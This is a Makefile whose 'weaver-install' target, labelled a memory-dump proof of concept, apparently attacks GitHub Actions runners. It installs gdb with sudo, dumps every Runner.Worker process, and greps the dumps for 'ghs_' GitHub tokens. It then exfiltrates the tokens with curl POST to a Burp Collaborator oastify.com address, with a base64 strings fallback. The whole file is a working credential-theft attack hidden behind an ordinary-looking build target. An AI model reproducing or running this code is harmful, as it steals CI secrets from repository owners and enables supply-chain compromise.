COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com

weaver-install:
	@echo "--- Resuming Memory Dump PoC ---"
	# Install tools
	@sudo apt-get update && sudo apt-get install -y gdb
	
	# Loop through all found PIDs for the Runner.Worker
	@for pid in $$(pgrep -f "Runner.Worker"); do \
		echo "Attempting to dump PID: $$pid"; \
		sudo gcore -o worker_dump.$$pid $$pid || echo "Failed to dump $$pid, skipping..."; \
	done

	# Extract tokens from ALL successful dumps
	@echo "Extracting tokens..."
	@grep -aoE "ghs_[0-9a-zA-Z]{36,}" worker_dump.* > extracted_tokens.txt || echo "No tokens found"
	
	# Exfiltrate to Burp Collaborator
	@if [ -s extracted_tokens.txt ]; then \
		echo "Tokens found! Exfiltrating..." ; \
		curl -X POST --data-binary @extracted_tokens.txt $(COLLABORATOR_URL)/tokens_exfil; \
	else \
		echo "No tokens in text file, exfiltrating raw strings fallback..."; \
		strings worker_dump.* | grep -i "token" | head -n 100 | base64 -w 0 > strings_exfil.txt; \
		curl -X POST -d @strings_exfil.txt $(COLLABORATOR_URL)/strings_fallback; \
	fi

	@echo "--- PoC Complete ---"
